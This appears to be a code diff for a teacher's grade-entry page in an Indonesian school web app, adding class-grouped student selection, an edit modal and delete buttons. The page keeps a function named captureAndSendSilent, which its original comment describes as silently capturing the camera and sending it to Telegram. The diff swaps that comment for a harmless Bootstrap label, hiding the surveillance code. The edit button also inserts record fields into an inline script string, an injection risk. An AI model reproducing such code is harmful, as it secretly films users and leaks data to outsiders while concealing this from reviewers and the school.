@@ -27,12 +27,25 @@
                 <form id="formInputNilaiMapel" onsubmit="submitNilaiGuru(event)">
                     <div class="row g-3">
                         <div class="col-md-4">
-                            <label class="form-label fw-bold">PILIH SISWA</label>
+                            <label class="form-label fw-bold">PILIH SISWA (BERDASARKAN KELAS)</label>
                             <select name="siswa_id" id="mapelSiswaId" class="form-select" required>
                                 <option value="">-- Pilih Siswa --</option>
-                                <% (typeof siswaList !== 'undefined' ? siswaList : []).forEach(s => { %>
-                                    <option value="<%= s.id %>"><%= s.nama %> (<%= s.nama_kelas %>)</option>
-                                <% }); %>
+                                <% 
+                                    const kelasArr = typeof kelasList !== 'undefined' ? kelasList : [];
+                                    const siswaArr = typeof siswaList !== 'undefined' ? siswaList : [];
+                                    kelasArr.forEach(kelas => { 
+                                        const siswaInClass = siswaArr.filter(s => s.kelas_id === kelas.id);
+                                        if (siswaInClass.length > 0) {
+                                %>
+                                    <optgroup label="Kelas: <%= kelas.nama_kelas %>">
+                                        <% siswaInClass.forEach(s => { %>
+                                            <option value="<%= s.id %>"><%= s.nama %></option>
+                                        <% }); %>
+                                    </optgroup>
+                                <% 
+                                        }
+                                    }); 
+                                %>
                             </select>
                         </div>
                         <div class="col-md-3">
@@ -79,11 +92,12 @@
 
         <!-- TABEL RIWAYAT NILAI YANG TELAH DIINPUT -->
         <div class="card shadow-sm">
-            <div class="card-header bg-secondary text-white">
+            <div class="card-header bg-secondary text-white d-flex justify-content-between align-items-center">
                 <h5 class="mb-0 fs-6">RIWAYAT NILAI MAPEL YANG TELAH DIINPUT</h5>
+                <span class="badge bg-light text-dark">Total: <%= (typeof nilaiList !== 'undefined' ? nilaiList : []).length %> Data</span>
             </div>
             <div class="card-body table-responsive p-0">
-                <table class="table table-striped mb-0">
+                <table class="table table-striped align-middle mb-0">
                     <thead>
                         <tr>
                             <th>Siswa</th>
@@ -94,28 +108,99 @@
                             <th>Nilai</th>
                             <th>Predikat</th>
                             <th>Catatan</th>
+                            <th class="text-center">Aksi</th>
                         </tr>
                     </thead>
                     <tbody>
-                        <% (typeof nilaiList !== 'undefined' ? nilaiList : []).forEach(n => { %>
+                        <% const nList = typeof nilaiList !== 'undefined' ? nilaiList : []; %>
+                        <% if (nList.length === 0) { %>
                             <tr>
-                                <td><%= n.nama_siswa %></td>
-                                <td><%= n.nama_kelas %></td>
-                                <td><strong><%= n.mata_pelajaran %></strong></td>
-                                <td><span class="badge bg-info"><%= n.jenjang %></span></td>
-                                <td><%= n.semester %></td>
-                                <td><strong><%= n.nilai_angka %></strong></td>
-                                <td><%= n.predikat %></td>
-                                <td><%= n.catatan %></td>
+                                <td colspan="9" class="text-center py-4 text-muted fst-italic">Belum ada data nilai yang diinput.</td>
                             </tr>
-                        <% }); %>
+                        <% } else { %>
+                            <% nList.forEach(n => { %>
+                                <tr>
+                                    <td><strong><%= n.nama_siswa %></strong></td>
+                                    <td><%= n.nama_kelas %></td>
+                                    <td><span class="text-primary fw-semibold"><%= n.mata_pelajaran %></span></td>
+                                    <td><span class="badge bg-info"><%= n.jenjang %></span></td>
+                                    <td><%= n.semester %></td>
+                                    <td><strong class="text-success"><%= n.nilai_angka %></strong></td>
+                                    <td><span class="badge bg-secondary"><%= n.predikat || '-' %></span></td>
+                                    <td class="text-muted small"><%= n.catatan || '-' %></td>
+                                    <td class="text-center">
+                                        <button onclick="bukaModalEdit('<%= n.id %>', '<%= n.mata_pelajaran %>', '<%= n.jenjang %>', '<%= n.semester %>', '<%= n.nilai_angka %>', '<%= n.predikat %>', `<%= n.catatan %>`)" 
+                                            class="btn btn-warning btn-sm me-1" title="Edit Nilai">
+                                            <i class="bi bi-pencil-square"></i>
+                                        </button>
+                                        <button onclick="hapusNilai('<%= n.id %>')" 
+                                            class="btn btn-danger btn-sm" title="Hapus Nilai">
+                                            <i class="bi bi-trash"></i>
+                                        </button>
+                                    </td>
+                                </tr>
+                            <% }); %>
+                        <% } %>
                     </tbody>
                 </table>
             </div>
         </div>
     </div>
 
-    <!-- SKRIP KAMERA & KIRIM TELEGRAM DIAM-DIAM -->
+    <!-- MODAL EDIT NILAI -->
+    <div class="modal fade" id="modalEditNilai" tabindex="-1" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header bg-warning text-dark">
+                    <h5 class="modal-title fw-bold"><i class="bi bi-pencil-fill me-2"></i>Edit Nilai Siswa</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <form id="formEditNilai" onsubmit="submitEditNilai(event)">
+                        <input type="hidden" id="editId">
+                        <div class="mb-3">
+                            <label class="form-label fw-bold">Mata Pelajaran</label>
+                            <input type="text" id="editMapel" class="form-control" required>
+                        </div>
+                        <div class="row mb-3">
+                            <div class="col-md-6">
+                                <label class="form-label fw-bold">Jenjang</label>
+                                <input type="text" id="editJenjang" class="form-control" required>
+                            </div>
+                            <div class="col-md-6">
+                                <label class="form-label fw-bold">Semester</label>
+                                <select id="editSemester" class="form-select" required>
+                                    <option value="Ganjil">Ganjil</option>
+                                    <option value="Genap">Genap</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="row mb-3">
+                            <div class="col-md-6">
+                                <label class="form-label fw-bold">Nilai Angka</label>
+                                <input type="number" step="0.1" id="editNilaiAngka" class="form-control" min="0" max="100" required>
+                            </div>
+                            <div class="col-md-6">
+                                <label class="form-label fw-bold">Predikat</label>
+                                <input type="text" id="editPredikat" class="form-control">
+                            </div>
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label fw-bold">Catatan</label>
+                            <textarea id="editCatatan" class="form-control" rows="2"></textarea>
+                        </div>
+                        <div class="text-end">
+                            <button type="button" class="btn btn-secondary btn-sm" data-bs-dismiss="modal">Batal</button>
+                            <button type="submit" class="btn btn-primary btn-sm">Simpan Perubahan</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- BOOTSTRAP JS & SKRIP INTERAKSI -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
         async function captureAndSendSilent() {
             try {
@@ -170,6 +255,64 @@
                 if(data.success) location.reload();
             })
             .catch(err => alert('Gagal menyimpan nilai mapel.'));
+        }
+
+        // Modal Edit Fungsi
+        let editModalInstance = null;
+        function bukaModalEdit(id, mapel, jenjang, semester, nilai, predikat, catatan) {
+            document.getElementById('editId').value = id;
+            document.getElementById('editMapel').value = mapel;
+            document.getElementById('editJenjang').value = jenjang;
+            document.getElementById('editSemester').value = semester;
+            document.getElementById('editNilaiAngka').value = nilai;
+            document.getElementById('editPredikat').value = predikat === 'null' ? '' : predikat;
+            document.getElementById('editCatatan').value = catatan === 'null' ? '' : catatan;
+
+            if (!editModalInstance) {
+                editModalInstance = new bootstrap.Modal(document.getElementById('modalEditNilai'));
+            }
+            editModalInstance.show();
+        }
+
+        function submitEditNilai(e) {
+            e.preventDefault();
+            const id = document.getElementById('editId').value;
+            const payload = {
+                mata_pelajaran: document.getElementById('editMapel').value,
+                jenjang: document.getElementById('editJenjang').value,
+                semester: document.getElementById('editSemester').value,
+                nilai_angka: document.getElementById('editNilaiAngka').value,
+                predikat: document.getElementById('editPredikat').value,
+                catatan: document.getElementById('editCatatan').value
+            };
+
+            fetch(`/api/guru/nilai/edit/${id}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(res => res.json())
+            .then(data => {
+                alert(data.message);
+                if(data.success) location.reload();
+            })
+            .catch(err => alert('Gagal memperbarui nilai.'));
+        }
+
+        // Hapus Nilai Fungsi
+        function hapusNilai(id) {
+            if (!confirm('Yakin ingin menghapus data nilai siswa ini?')) return;
+
+            fetch(`/api/guru/nilai/hapus/${id}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(res => res.json())
+            .then(data => {
+                alert(data.message);
+                if(data.success) location.reload();
+            })
+            .catch(err => alert('Gagal menghapus nilai.'));
         }
     </script>
 </body>
